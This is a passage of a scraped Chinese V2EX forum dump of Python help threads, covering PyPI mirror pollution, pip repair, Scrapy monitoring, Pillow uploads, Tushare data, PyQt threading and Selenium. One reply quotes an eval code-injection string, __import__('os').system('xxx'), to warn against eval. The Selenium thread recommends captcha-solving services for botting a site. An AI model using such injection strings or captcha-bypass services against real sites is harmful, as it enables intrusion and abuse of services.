这个包老早就有了", " ==", "去 tuna 报了", "去 ", " 看了一圈发现全球都这样。。", " 官方已经没有了，估计要等到下一次同步才会清除了", "用三方库还得要小心啊， mirrors 只负责同步准确不负责内容安全", "这。。。", "动不动就想搞什么大新闻，现在的年轻人就是图样图森破，不如多读点书。", "全球都被污染了，应该是官方源的问题\r", "用了这么久 PyPi 我竟然还不清楚验证完整性的方式…如果是 Linux 源 GPG 信任链很严密那么丝毫不用担心。\r", "谁能给我解答一下呢？关于 PyPi 和 homebrew 的验证方式", " homebrew 是 sha256 hash ，不过最开始的 rb 文件不对就没办法。 pypi 没仔细看过，好像也是类似 hash ，但使用第三方源都是没保证的", " 这和完整性没什么关系啊， pypi 不审核包，你随时可以新建一个这样的包啊\r", "\r", "而且这个明显是上游的问题， ", " pypi twitter bot 都有这些包的历史，只是上游删除了，下游同步没有跟着删除罢了", "厉害了我的哥", "这尼玛真是超级大的新闻啊，坐等新闻报道", "坐等后续。。。", "已经清理掉了", "围观~", "pypi 官方被污染了吧。\r", "\r", "其实注册 pypi 很容易。", "  已经强制重新同步了。", "我滴妈呀，一直使用豆瓣源，好像，昨天是有问题，我还以为是我网络出问题了", "官方源出问题了吧=_="]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>问题描述：我看到提示信息“ You are using pip version 8.1.2, however version 9.0.1 is available.\nYou should consider upgrading via the 'pip install --upgrade pip' command.”，就执行了 pip install --upgrade pip ，结果升级失败了，执行 pip 命令出现如下报错信息</p>\n<pre><code>Utopia:downloads utopia$ pip\nTraceback (most recent call last):\nFile \"/usr/local/bin/pip\", line 9, in &lt;module&gt;\nload_entry_point('pip==8.1.2', 'console_scripts', 'pip')()\nFile     \"/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/pkg_resources/__init__.py\", line 565, in load_entry_point\nreturn get_distribution(dist).load_entry_point(group, name)\nFile \"/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/pkg_resources/__init__.py\", line 2696, in load_entry_point\nraise ImportError(\"Entry point %r not found\" % ((group, name),))\nImportError: Entry point ('console_scripts', 'pip') not found\n</code></pre>\n</div></div>"], "reply": "3", "tittle": "求助: Mac 下的 pip 损坏了如何修复", "comment": ["重新安装覆盖解决了", "为啥要在系统的 python 里面搞，用 pyenv 啊", "也可以试试手动删除，用 easy_install 重新安装\r", "\r", "我比较推荐 virtualenv"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请教大家一个问题，先让我安利下这个项目 0.0 ，目前用 flask 写了个<a href=\"https://github.com/ioiogoo/scrapy-monitor/tree/master\" rel=\"nofollow\">scrapy 的实时监控模块</a>，代码虽然很丑陋，但是很好玩，使用也很方便，实现起来很简单，在 scrapy 运行的过程中，新建一个 middleware ，当有 request 经过 middleware 的时候，将当前 crawler 的状态保存到 redis ，这样在 redis 中就有实时的爬虫状态信息了，前端一直 ajax 获取 redis 里面的信息放到前端渲染出来就行了。</p>\n<p>这是效果图\n<img alt=\"爬虫监控.jpg\" src=\"https://ooo.0o0.ooo/2016/12/26/5860ccbb8fec5.jpg\"></p>\n<p>那么问题来了，目前是每一个 request 产生的时候就会保存一个当前信息，所以如果爬虫项目过大时， request 达到十万甚至百万级别的时候， redis 里面也会有相应数量的 stats 信息，这时候 redis 会不会占用很大的内存？这种情况有什么好的解决办法吗？谢谢各位 Dalao</p>\n</div></div>"], "reply": "8", "tittle": "Scrapy 爬虫的实时监控", "comment": ["内存主要消耗在 time.strftime('%Y-%m-%d %H:%M:%S') 上\r", "\r", "'downloader/request_count', 'downloader/response_count','downloader/response_status_count/200', 'item_scraped_count' 看上去都是比较小的数字，占不了太多内存，就算乘以 100 万也不会太大\r", "\r", "\r", "这里如果真的跳过了， 4 个列表中的数据是不是就不同步了\r", "\r", "\r", "这里数据量超过 POINTLENGTH 以后，前端是不是就不更新了", " 感谢这么细致的回复。\r", "1 、可能是我没有讲清楚，我存在 redis 里面的数据不是数字，因为前端展示的时候，那条线是由若干个点组成的，存在 redis 里面的数据是这样的， ", "\r", "我取的时候会把所有数据以 list 的形式取出来，所以每条线的数据是这样的一个 list\r", "`[{'value': ['2016-12-26 17:08:37', 1]}, {'value': ['2016-12-26 17:08:40', 31]}, {'value': ['2016-12-26 17:08:44', 61]}, {'value': ['2016-12-26 17:08:49', 91]}]`， list 里的每一项代表一个点，所以项目到后面，这个 list 会很长，存在 redis 里面的数据也会非常多\r", "\r", "2 、因为 scrapy 里面 stats.keys 非常多，可以看一下， ", " ，而且很多数据意义不大，所以我只需要监控几个有意义的 key ，所以不在我 STATS_KEYS 里面的 key 或者当前 stats 没有这个 key 时我就跳过\r", "\r", "3 、前面说了每条线是由若干个点组成，当点太多了的时候，可以设置 POINTLENGTH ，从 redis 里面只取出这么多个数据，限制前端显示的点数，也就相当于限制了时间范围\r", "\r", "表达不是太好，如果还有什么问题我没讲清楚的欢迎探讨", "1. middleware 每取到一次数据，就会生成 4 个 {'value': ['2016-12-26 17:08:37', 1]} ，不如生成一个 {'value': ['2016-12-26 17:08:37', 1,2,3,4]}，或者 {'value': [1482745171, 1,2,3,4]}，或者[1482745171, 1,2,3,4]\r", "\r", "2.https://github.com/ioiogoo/scrapy-monitor/blob/master/visiter/visiter/monitor/statscol.py#L25\r", "已经保证只能取到 4 个值了，如果其中某个值为 None ，就只剩 3 个值了\r", "\r", "3.如果我想改动这个值，是不是要修改配置文件，然后重启程序？为什么不动态计算，或者把总数给前端，从前端接受范围？", " \r", "1. 1 、 2 、 3 等每一个 value 都要生成对应的 time ，不然怎么能记录下随时间的变化过程呢？坐标系上横轴是时间，纵轴是 value ，你这样的话就没有表现出随时间的变化啊，['2016-12-26 17:08:37', 1,2,3,4]}这样的 list4 个值都对应到一个时间，是没有意义的，所以必须是一个 time 对应一个 value\r", "\r", "2.我默认设置的 STATS_KEYS 大部分爬虫都会有值的，当然如果为 None 的话，前端不会显示这条线，因为本身就没有数据，这点你可以仔细看上面的效果图最前面的部分，刚开始 item 还没有的时候，就不会显示这条线\r", "\r", "3.这点的话的确是要修改配置文件才能起作用，后面我会加上动态修改的功能。", "一个 for 循环里 scrapy stat 是固定的，这个时间如果变化了，就是你 for 循环执行得太慢了，这个时间间隔都用来写 redis 了吧。我出于节省内存的角度考虑，可以把 4 个值合并到一起，如果某个值不存在，可以设置成 -1 。\r", "\r", "考虑一种情况，你程序已经运行一次， redis 里有相应的结构了，然后再次运行，查找某个 key 时没找到，这时候你跳过了，而不是写一个无意义的值，等取数据的时候，你根据步长过滤数据，这一列的时间点可能和其他列完全不对应。这时候你图上的竖线就没有意义了。", " 对对对，根据步长过滤数据就是会出现这样的情况， ", " ，但是因为时间间隔很短，所以问题不是很大，后面有时间再解决吧。\r", "\r", "关于把 4 个值合并到一起，一开始我有想到这样做，一个是时间统一，二是只用新建一个 dict ，节省内存，三是减少插入 redis 的次数，但是缺点是，因为前端需要的数据是[{\"value\":[time, value]}]这样的格式，所以用上面方法的时候还需要把{['2016-12-26 17:08:37', 1,2,3,4]}的数据拆成 4 份再组装起来，也比较损耗性能，很烦，所以，我选择目前的方法。", "公司的爬虫监控差不多就是这么干的，但是我觉得没啥意义。\r", "因为 ELK 一套分分中就能搭出来。。", " 其实爬虫本身的话就比较枯燥，只是通过这种方式将其中的过程展示出来，增加点趣味性而已，要追究其意义的话确实不大。\r", "生活又何尝不是这样呢？很多事情确实毫无意义，只是，其中的趣味只有尝试后才知道。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>RT, 假设有列表 a = [1, 2, 3, 4]，那么可以用 str(a)转成字符串 '[1,2,3,4]'<br>\n现在反过来想把字符串'[1,2,3,4]'转换成列表[1,2,3,4]，有什么好的办法吗<br>\n拒绝 eval ，毕竟危险函数，最好是类似 json 这样的</p>\n</div></div>"], "reply": "8", "tittle": "python 字符串形式的列表转列表", "comment": ["```\r", ">>> import json\r", ">>> a = '[1,2,2]'\r", ">>> b = json.loads(a)\r", ">>> b\r", "[1, 2, 2]\r", "```", ">>> a = '[1,2,2]'\r", ">>> b = list(a)[1::2]\r", ">>> b\r", "['1', '2', '2']\r", "\r", "如果有空格，可以先 split 然后 join 去空格（逃\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "还是用 json 吧", "ast. literal_eval safe", "a = '[1, 2, 3, 4]'.strip('[').strip(']').split(',')", "eval 确实是危险函数，但是有几个人能写出让它危险的代码来，就你这个还怕危险。。。", "eval 虽然 evil ，但是只是将字符串转为 list 的话有多危险？？", " 正解", " \r", " \r", "这里只是举个例子说明想要实现的是将传入字符串转为列表\r", "但程序并不会总是照着我们的想法来\r", "想象下如果传入的字符串是 “__import__('os').system('xxx')” 是什么后果\r", "最后还是很感谢回答\r", " 给出了很好的答案"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>虽然有 awesome-python 但是你懂的， awesome-python 是靠人人肉统计的，延时很严重\n而且用 awesome-python 你是不会知道 mitmproxy 的</p>\n</div></div>"], "reply": "6", "tittle": "你们是如何知道 python 有哪些新的热门库的", "comment": ["chrome 有一个插件叫做 `GitHunt Dark`", " 这是什么东西　？", "github trending ，语言选 pythob", "python 没有热门库。还是 npm 库比较热门。", "github trending", "V2EX"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在是先把用户上传的图片保存到服务器硬盘，然后用 Pillow 打开已保存的图片再做压缩处理。</p>\n<p>Pillow 可以直接处理表单上传的图片文件吗？（就是在保存到硬盘之前先做压缩处理，原始图片文件不需要保存到服务器硬盘）。<br>\n说明：对用户上传的文件后缀类型做了判断，确实是 Pillow 可以处理的图片格式。不知道 Pillow 能否直接在内存里就处理 Filestorage 这种类型的数据？还是可以通过 Python 的 BytesIO 数据类型来处理？</p>\n</div></div>"], "reply": "18", "tittle": "Pillow 可以直接处理用户上传的图片文件吗？", "comment": ["这跟 pil 无关...", "我都是直接往 StringIO 里面一塞就送给 pil 的，不保存临时文件", "可以", " @", " 这是什么错误的？用 StringIO 说是 bytes ；用 BytesIO 说不能识别 image 文件：\r", "\r", "im = Image.open(StringIO(form.img.data.read()))  \r", "出错： TypeError: initial_value must be str or None, not bytes  \r", "\r", "im = Image.open(BytesIO(form.img.data.read()))  \r", "出错： OSError: cannot identify image file <_io.BytesIO object at 0x03A83B90>", "顺便问一下，图片处理了以后还要保存一下，但是同样也不想保存在自己服务器上，怎么处理？", " 请看文档，请用 PIL.Image.frombuffer\r", "\r", "\r", " 不想保存？那么要直接用流返回吗？我是不建议这样做，定期删除就好了。一般都是写在磁盘，用户访问就让 nginx 直接返回该文件。", " 上传图片，处理，但是最终是保存在 cdn 上，所以这个地方不知道怎么处理", " 谢谢，看了下 Image.frombuffer 感觉有点绕，舍近求远的感觉，试了一下也没行 *-*  \r", "\r", "我从 img_url 上取图片文件，然后可以用 BytesIO 直接处理：\r", "r = requests.get(img_url)\r", "img = Image.open(BytesIO(r.content))  \r", "\r", "Image.frombuffer 官方文档也特别提到，如果能获得 entire image file ，可以用 BytesIO ，没必要用 frombuffer 。  \r", "如果能从 Form 表单上传的文件中，直接能像 requests.get(img_url)取到图片，就不用饶一道弯用 frombuffer 专门处理 pixel data 。  \r", "试了各种方法，现在就是没能从上传的文件中成功取到图片格式的文件。。。不知道是我方法不对，还是根本没有这个方法（前提是不保存到硬盘）？", "我比较建议根据 hash 值存到临时文件夹，定期清理，这样做的好处很多， 1 防止用户重复上传， 2 对比直接处理文件流，遇到异常情况不需要重新上传， 3 如果短时间内重复文件较多可以节省带宽，提升用户体验。\r", "如果写文件权限受限当我没说。", " \r", "先检查一下  form.img.data.read() 的类型，再 dump 一下 form.img.data.read() 的内容，和直接 get 的做一下对比。", " 的确是那样也可以，我也没细看文档。一般我用 BytesIO 就是当 buffer 用，因此查文档都是查 buffer 相关的。用 open 肯定是可以的，毕竟官方文档也是这样说，但是现在就出现了个问题，你本身图片已经是载入内存了,Image.open 又产生了一个副本，若是内存紧张的话要注意一下。\r", "\r", " 上传图片处理完之后你就写磁盘，然后再而外用 rsync 或者你们 cdn 提供的客户端上传不就好了？上传完就删掉磁盘的文件，文件删除还是很快的嘛。", " \r", "又在 SO 上逛了一圈。\r", "两点建议吧，\r", "1. seek(0) 试试。\r", "2. 检查原始数据，可能 form 过来的 data 就是有问题。", " form 过来的 data 一直就是 filestorage ，各种方式去取，就是无法得到原始的 upload.jpg 这样的文件格式。这个才是核心故障 。 就是因为这个问题还没有直接解决，才绕弯找其它格式做桥接。  \r", "\r", "我也比较疑惑，这个用户 upload 到服务器内存里的文件到底是个什么编码格式（出错提示 __io.buffer ）？怎么就没有方法还原出上传之前的文件呢？", " \r", "是 flask 么\r", "filestorage 本身就是个文件的啊，试试直接 Image.open(form.img.data)\r", "\r", "这显然不是 Pillow 的问题，仔细读读 API 吧。", " 是 flask ， image.open(form.img.data)是本能反应，你有打开过的经验吗？", "谢谢，我再检查下上传的文件类型看看，是不是在当前 pillow 版本支持处理的格式", "flask:\r", "f = request.files[\"upload\"]\r", "img_obj = Image.open(f)\r", "region = (x,y,w,h)\r", "crop_img = img_obj.crop(region)\r", "crop_img.save(addr)\r", "\r", "关键我不想保存至本地，而是直接上传到其他服务器上，各个大神们，你们怎么处理？？", " 对于其他服务器等于是再 POST 一次，如果是局域网内的服务好弄，如果是走互联网，还是通过 TCP/IP 来传。这个转存，也没有具体实际跑过的经验呐。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>说在前面</h1>\n<p>在这里依然分享自己作为一个程序员学习金融的过程和一些好玩的应用工具，希望对大家有帮助。</p>\n<p>今天讨论一下 python 获取金融数据的方法，主要讲述如何通过 tushare 包获取金融数据。</p>\n<p>TuShare 是一个著名的免费、开源的 python 财经数据接口包。其官网主页为：<strong>TuShare - 财经数据接口包。</strong><a href=\"http://tushare.waditu.com/\" rel=\"nofollow\">http://tushare.waditu.com/</a> 该接口包如今提供了大量的金融数据，涵盖了股票、基本面、宏观、新闻的等诸多类别数据（具体请自行查看官网），并还在不断更新中。目前股票的数据长度为三年，虽然有点短，但也可以基本满足量化初学者的回测需求。</p>\n<h1>使用教程</h1>\n<p>1.安装加载</p>\n<p>安装 tushare 包很简单，我使用的是 pycharm ，可以用其中的包管理器安装。然后通过 import 加载：</p>\n<p><code>import tushare as ts;</code></p>\n<p>2.简单函数使用</p>\n<p>下面我们用几个简单的函数查看 tushare 的基本功能，想要了解的更多的功能还是建议仔细阅读官方文档，里面将可提供的数据与调用函数写的的很清楚。</p>\n<p><strong>1.股票数据</strong></p>\n<p>我们主要还是应该掌握如何用 tushare 获取股票行情数据，使用的是 ts.get_hist_data()函数，其</p>\n<p>输入参数为：</p>\n<p><strong>code ：</strong>股票代码，即 6 位数字代码，或者指数代码（ sh=上证指数 sz=深圳成指 hs300=沪深 300 指数 sz50=上证 50 zxb=中小板 cyb=创业板）\n<br><strong>start ：</strong>开始日期，格式 YYYY-MM-DD\n<br><strong>end ：</strong>结束日期，格式 YYYY-MM-DD\n<br><strong>ktype ：</strong>数据类型， D=日 k 线 W=周 M=月 5=5 分钟 15=15 分钟 30=30 分钟 60=60 分钟，默认为 D\n<br><strong>retry_count ：</strong>当网络异常后重试次数，默认为 3\n<br><strong>pause:</strong> 重试时停顿秒数，默认为 0</p>\n<p>返回值说明：</p>\n<p><strong>date ：</strong>日期\n<br><strong>open ：</strong>开盘价\n<br><strong>high ：</strong>最高价\n<br><strong>close ：</strong>收盘价\n<br><strong>low ：</strong>最低价\n<br><strong>volume ：</strong>成交量\n<br><strong>price_change ：</strong>价格变动\n<br><strong>p_change ：</strong>涨跌幅\n<br><strong>ma5 ：</strong>5 日均价\n<br><strong>ma10 ：</strong>10 日均价\n<br><strong>ma20:</strong> 20 日均价\n<br><strong>v_ma5:</strong> 5 日均量\n<br><strong>v_ma10:</strong> 10 日均量\n<br><strong>v_ma20:</strong> 20 日均量\n<br><strong>turnover:</strong> 换手率[注：指数无此项]</p>\n<p>具体例子：</p>\n<pre><code>\nts.get_hist_data('600848')\n\n date      open    high   close     low     volume    p_change   ma5    \n2012-01-11   6.880   7.380   7.060   6.880   14129.96     2.62   7.060\n2012-01-12   7.050   7.100   6.980   6.900    7895.19    -1.13   7.020\n2012-01-13   6.950   7.000   6.700   6.690    6611.87    -4.01   6.913\n2012-01-16   6.680   6.750   6.510   6.480    2941.63    -2.84   6.813\n2012-01-17   6.660   6.880   6.860   6.460    8642.57     5.38   6.822\n2012-01-18   7.000   7.300   6.890   6.880   13075.40     0.44   6.788\n2012-01-19   6.690   6.950   6.890   6.680    6117.32     0.00   6.770\n2012-01-20   6.870   7.080   7.010   6.870    6813.09     1.74   6.832\n\ndate         ma10    ma20      v_ma5     v_ma10     v_ma20     turnover\n\n2012-01-11   7.060   7.060   14129.96   14129.96   14129.96     0.48\n2012-01-12   7.020   7.020   11012.58   11012.58   11012.58     0.27\n2012-01-13   6.913   6.913    9545.67    9545.67    9545.67     0.23\n2012-01-16   6.813   6.813    7894.66    7894.66    7894.66     0.10\n2012-01-17   6.822   6.822    8044.24    8044.24    8044.24     0.30\n2012-01-18   6.833   6.833    7833.33    8882.77    8882.77     0.45\n2012-01-19   6.841   6.841    7477.76    8487.71    8487.71     0.21\n2012-01-20   6.863   6.863    7518.00    8278.38    8278.38     0.23\n\n</code></pre>\n<p>也可以设定历史数据的起始时间：</p>\n<pre><code>\nts.get_hist_data('600848',start='2015-01-05',end='2015-01-09')\n\n date       open    high   close     low    volume   p_change   ma5    ma10 2015-01-05  11.160  11.390  11.260  10.890  46383.57     1.26  11.156  11.212\n2015-01-06  11.130  11.660  11.610  11.030  59199.93     3.11  11.182  11.155\n2015-01-07  11.580  11.990  11.920  11.480  86681.38     2.67  11.366  11.251\n2015-01-08  11.700  11.920  11.670  11.640  56845.71    -2.10  11.516  11.349\n2015-01-09  11.680  11.710  11.230  11.190  44851.56    -3.77  11.538  11.363\n date        ma20     v_ma5    v_ma10     v_ma20      turnover\n2015-01-05  11.198  58648.75  68429.87   97141.81     1.59\n2015-01-06  11.382  54854.38  63401.05   98686.98     2.03\n2015-01-07  11.543  55049.74  61628.07  103010.58     2.97\n2015-01-08  11.647  57268.99  61376.00  105823.50     1.95\n2015-01-09  11.682  58792.43  60665.93  107924.27     1.54\n\n</code></pre>\n<p>其他：</p>\n<pre><code>\nts.get_hist_data('600848', ktype='W') #获取周 k 线数据\nts.get_hist_data('600848', ktype='M') #获取月 k 线数据\nts.get_hist_data('600848', ktype='5') #获取 5 分钟 k 线数据\nts.get_hist_data('600848', ktype='15') #获取 15 分钟 k 线数据\nts.get_hist_data('600848', ktype='30') #获取 30 分钟 k 线数据\nts.get_hist_data('600848', ktype='60') #获取 60 分钟 k 线数据\nts.get_hist_data('sh'）#获取上证指数 k 线数据，其它参数与个股一致，下同\nts.get_hist_data('sz'）#获取深圳成指 k 线数据\nts.get_hist_data('hs300'）#获取沪深 300 指数 k 线数据\nts.get_hist_data('sz50'）#获取上证 50 指数 k 线数据\nts.get_hist_data('zxb'）#获取中小板指数 k 线数据\nts.get_hist_data('cyb'）#获取创业板指数 k 线数据\n\n</code></pre>\n<p><strong>2.获取基本面数据</strong> (在使用过程中，发现没有通联数据的干净，有不少脏数据。感兴趣的可以比对一下 <a href=\"https://uqer.io/data/browse/0/?page=1\" rel=\"nofollow\">https://uqer.io/data/browse/0/?page=1</a> ）</p>\n<p>通过 tushare 我们还可以通过 ts.get_stock_basics()获取基本面数据（返回结果部分展示）：</p>\n<pre><code>\nts.get_stock_basics()\n\ncode    name      industry  area     pe     outstanding    totals   totalAssets                                                                            \n300563    N 神宇  通信设备   江苏    26.73      2000.00     8000.00  4.216000e+04   \n601882   海天精工     机床制造   浙江    26.83      5220.00    52200.00  1.877284e+05   \n601880    大连港       港口   辽宁    76.40    773582.00  1289453.63  3.263012e+06   \n300556   丝路视觉     软件服务   深圳   101.38      2780.00    11113.33  4.448248e+04   \n600528   中铁二局     建筑施工   四川   149.34    145920.00   145920.00  5.709568e+06   \n002495   佳隆股份       食品   广东   202.12     66611.13    93562.56  1.169174e+05   \n600917   重庆燃气     供气供热   重庆    76.87     15600.00   155600.00  8.444600e+05   \n002752   昇兴股份     广告包装   福建    75.14     12306.83    63000.00  2.387493e+05   \n002346   柘中股份     电气设备   上海   643.97      7980.00    44157.53  2.263010e+05   \n000680   山推股份     工程机械   山东     0.00    105694.97   124078.75  9.050701e+05  \n...\n\n</code></pre>\n<p><strong>3.宏观数据</strong></p>\n<p>我们以居民消费指数为例，可以通过 ts.get_cpi()函数获取（一次会获取 322 条，部分展示）：</p>\n<pre><code>\nprint ts.get_cpi()\n\n       month     cpi\n0    2016.10  102.10\n1     2016.9  101.90\n2     2016.8  101.34\n3     2016.7  101.77\n4     2016.6  101.88\n5     2016.5  102.04\n6     2016.4  102.33\n7     2016.3  102.30\n8     2016.2  102.28\n9     2016.1  101.75\n10   2015.12  101.64\n...\n\n</code></pre>\n<p><strong>4.查看最近新闻</strong></p>\n<p>tushare 包可以使用 ts.get_latest_news()函数可以查看最近的新闻，会返回 80 条，篇幅原因我们这里只展现前面 15 条。我们可以看到，都是新浪财经的新闻数据。</p>\n<pre><code>\nprint ts.get_latest_news();\n\n   classify                         title         time  \\\n0        美股            “特朗普通胀”预期升温 美国国债下挫  11-14 23:10   \n1        美股          特朗普：脸书、推特等社交媒体助我入主白宫  11-14 23:10   \n2        证券                11 月 14 日晚增减持每日速览  11-14 22:54   \n3        美股          财经观察：日本为何急于推动 TPP 批准程序  11-14 22:54   \n4        美股              新总统谜题：特朗普会连续加息吗？  11-14 22:52   \n5        证券      神州专车财报遭质疑 增发 100 亿股东退出需 50 年  11-14 22:41   \n6        证券           恒大闪电杀回马枪锁仓半年 戒短炒了吗？  11-14 22:38   \n7      国内财经         楼继伟力推改革做派 或加快国有资本划拨社保  11-14 22:36   \n8        美股            开盘：美股周一小幅高开 延续上周涨势  11-14 22:32   \n9        美股            喜达屋创始人：当好总统就要走中庸之道  11-14 22:24   \n10       证券              北京高华：将乐视网评级下调至中性  11-14 22:09   \n11       美股             11 月 14 日 22 点交易员正关注要闻  11-14 22:02   \n12       美股           摩根大通：新兴市场股市、货币的前景悲观  11-14 21:55   \n13     国内财经        人民日报刊文谈全面深化改革这三年：啃下硬骨头  11-14 21:46   \n14       证券       泽平宏观：经济 L 型延续 地产销量回落投资超预期  11-14 21:43   \n15       证券       黄燕铭等五大券商大佬告诉你 2017 年买点啥？  11-14 21:41   \n\nurl  \n0   http://finance.sina.com.cn/stock/usstock/c/201...  \n1   http://finance.sina.com.cn/stock/usstock/c/201...  \n2   http://finance.sina.com.cn/stock/y/2016-11-14/...  \n3   http://finance.sina.com.cn/stock/usstock/c/201...  \n4   http://finance.sina.com.cn/stock/usstock/c/201...  \n5   http://finance.sina.com.cn/stock/marketresearc...  \n6   http://finance.sina.com.cn/stock/marketresearc...  \n7   http://finance.sina.com.cn/china/gncj/2016-11-...  \n8   http://finance.sina.com.cn/stock/usstock/c/201...  \n9   http://finance.sina.com.cn/stock/usstock/c/201...  \n10  http://finance.sina.com.cn/stock/s/2016-11-14/...  \n11  http://finance.sina.com.cn/stock/usstock/c/201...  \n12  http://finance.sina.com.cn/stock/usstock/c/201...  \n13  http://finance.sina.com.cn/china/gncj/2016-11-...  \n14  http://finance.sina.com.cn/stock/marketresearc...  \n15  http://finance.sina.com.cn/stock/marketresearc...  \n\n</code></pre>\n<h1>结语</h1>\n<p>由于文章篇幅有限，故而只能做一个简单的概述，其是 tushare 包还有着丰富的功能，等待着大家去开发，希望大家可以多去看官网文档，养成良好的学习习惯，共同进步。</p>\n<p>本片文章转自知乎，作者：温如</p>\n</div></div>"], "reply": "3", "tittle": "『python 金融应用』Tushare 财经数据包", "comment": ["使用过，返回太慢，经常超时", " 开源的项目，作者不易，主要是没服务器。", " 哦，不过玩玩的话足够了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看了这篇关于 GUI 情景中的 socket 编程的文章  <a href=\"http://www.jianshu.com/p/731a8359c2c5\" rel=\"nofollow\">http://www.jianshu.com/p/731a8359c2c5</a></p>\n<p>然后仿照着按照自己的业务逻辑去做，出现了以下的问题。</p>\n<p>现在有两个线程一个队列，一个线程负责入队，一个负责出队。\n每个线程都是 1s 进行一次操作。\n但是负责入队的线程经常会阻塞，就像阻塞了几秒，一下子入队好几次。</p>\n<p>以下的代码都是关于队列cmd_q的<br>\n入队相关的代码</p>\n<pre><code>def send_heartbeat(self, receive_dic=None):\n    # 转换为连接状态\n    self.api_manager.socket_is_connect = True\n\n    # 开始发送心跳\n    self.heartbeat_thread = threading.Thread(target=self.__send_heartbeat_timer)\n    self.heartbeat_thread.start()\n\n\ndef __send_heartbeat_timer(self):\n    while self.api_manager.socket_is_connect:\n        print(\"%s !!!!!!!!!!!!!put command  start!!!!!\" % time.asctime(time.localtime(time.time())))\n        self.api_manager.client.cmd_q.put(ClientCommand(ClientCommand.SEND, \"heartbeat\"))\n        print(\"%s !!!!!!!!!!!!!put command  end!!!!!\" % time.asctime(time.localtime(time.time())))\n        logging.info(\"time: %s   send bearheart\", time.asctime(time.localtime(time.time())))\n        time.sleep(4) \n</code></pre>\n<p>出队相关的代码</p>\n<pre><code>def run(self):\n    while self.alive.isSet():\n        try:\n            # Queue.get with timeout to allow checking self.alive\n            # print(\"%s !!!!!!!!!!!!!get command!!!!!\" % time.asctime(time.localtime(time.time())))\n\n            print(\"%s !!!!!!!!!!!!!get command  start!!!!!\" % time.asctime(time.localtime(time.time())))\n            cmd = self.cmd_q.get(True, 1)\n            if (cmd.data == \"heartbeat\"):\n                print(\"%s !!!!!!!!!!!!!get command  end!!!!!\" % time.asctime(time.localtime(time.time())))\n            handler = self.handlers[cmd.type]\n            handler(cmd)\n        except queue.Empty as e:\n            continue\n</code></pre>\n</div></div>"], "reply": "10", "tittle": "GUI+多线程+socket+队列，怎么搞，入队阻塞！😂", "comment": ["我看到入队代码有个 time.sleep(4)", " 哈哈哈", " 是啊，每 4s 入队一次。这有什么问题吗？😢", " 楼上的意思是说，你入队之后会停 4 s 再进行一次入队。但是你又说你每个线程都是 1 s 操作。是这样的吧", " 哦哦，稍微改动过代码", "不知道你用的是什么 GUI 库，一般 GUI 库的线程问题，都应该结合 GUI 的对应 thread 函数来做，而不是直接启动 Python 的线程，这样才不会阻塞 GUI 的 event loop\r", "例如 pyqt4 的： ", " 我用的就是 pyqt4, 我后来发现的确不是入队的问题。而是像你说的线程的问题。\r", "\r", "我后来将程序改得简单粗暴，然后在周期性发送“ heartbeat ”的地方尝试使用了 QTimer 还是不能够解决问题了，也是在运行一段时间之后意外地阻塞一段时间。", " QTimer 利用了 Qt 的 event loop ，所以应该是不会阻塞界面的，但是 QTimer 到时间要执行的操作是一个耗时操作，这个会阻塞 QTimer 对象所在的线程，也就是主线程了，所以一般用 QThread 创建新的线程，然后在 run 函数中，创建 QTimer 的定时器，这样才不会阻塞主线程", "出队的 run()里面没有 sleep ，这样如果队列是空的（或者不是空的）不是一直在运行吗？ CPU 占用会比较高吧，可以插一个 sleep", " 我用得出队设置了 timeout ，所以队列为空的时候是会阻塞 1s ，队列不为空就一直工作。没错的话，应该是这样"]},
{"content": ["<div class=\"topic_content\">之前提问过怎么识别验证码，貌似方案实施比较困难。\r<br>\r<br>想试试直接等待用户自行输入验证码，再进行点击登陆操作。\r<br>\r<br>PS ：不是在命令行等待输入验证码，而是在 webdriver.Chrome 里面自行输入，当输入位数超过超过 3 时，即自动点击提交按钮。</div>"], "reply": "9", "tittle": "Python Selenium 怎么等待用户输入验证码？", "comment": ["那这还自动化啥。。。\r", "\r", "我看了你前面那个帖子，找打码平台啊，一个码也就一秒钟就给你返回了", "是自动化测试还是要刷什么东西", " 你确定 1 秒之内能回来？我测试了不止哦。截图保存，然后调用 API 。得花 3-4 秒了。", " 刷东西", " 求解打码平台", " 看楼主之前的提问贴", "  重新审视你的东西  确定要调用浏览器才能实现吗，如果只是卡在登陆，试试 手工登陆复制 cookies 放到 requests 抓。", "1 秒肯定是指你发起请求到打码服务器到打服务器返回的时间啊\r", "\r", "\r", "平台的话很多，若快， nx ，都行，我自己用的 nx ，避免广告自己搜 nx 打码或者牛叉打码", "selenium 有等待的方法的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>报错我能理解,但是这种情况怎么解决呢?\n本人才开始玩 python,各种没头绪啊\ntraceback 如下:</p>\n<pre><code>    Traceback (most recent call last):\n      File \"/usr/local/lib/python2.7/site-packages/flask/app.py\", line 1994, in __call__\n        return self.wsgi_app(environ, start_response)\n      File \"/usr/local/lib/python2.7/site-packages/flask/app.py\", line 1985, in wsgi_app\n        response = self.handle_exception(e)\n      File \"/usr/local/lib/python2.7/site-packages/flask/app.py\", line 1540, in handle_exception\n        reraise(exc_type, exc_value, tb)\n      File \"/usr/local/lib/python2.7/site-packages/flask/app.py\", line 1982, in wsgi_app\n        response = self.full_dispatch_request()\n      File \"/usr/local/lib/python2.7/site-packages/flask/app.py\", line 1614, in full_dispatch_request\n        rv = self.handle_user_exception(e)\n      File \"/usr/local/lib/python2.7/site-packages/flask/app.py\", line 1517, in handle_user_exception\n        reraise(exc_type, exc_value, tb)\n      File \"/usr/local/lib/python2.7/site-packages/flask/app.py\", line 1612, in full_dispatch_request\n        rv = self.dispatch_request()\n      File \"/usr/local/lib/python2.7/site-packages/flask/app.py\", line 1598, in dispatch_request\n        return self.view_functions[rule.endpoint](**req.view_args)\n      File \"/Users/chenchen/code/flask_scrapy/webapp/run.py\", line 91, in run\n        crawler = CrawlerProcess(settings)\n      File \"/usr/local/lib/python2.7/site-packages/scrapy/crawler.py\", line 239, in __init__\n        